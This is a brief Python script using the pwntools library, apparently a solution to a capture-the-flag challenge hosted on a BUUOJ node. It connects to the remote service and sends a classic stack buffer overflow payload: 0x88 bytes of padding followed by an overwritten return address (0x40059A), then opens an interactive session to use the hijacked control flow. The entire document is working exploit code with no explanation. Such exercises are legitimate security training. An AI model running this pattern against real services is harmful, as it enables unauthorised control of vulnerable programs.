from pwn import *
p = remote("node4.buuoj.cn",26204)
ret_arr = 0X40059A
payload = b'a'*(0x80 + 0x8) + p64(ret_arr)
p.sendline(payload)
p.interactive()
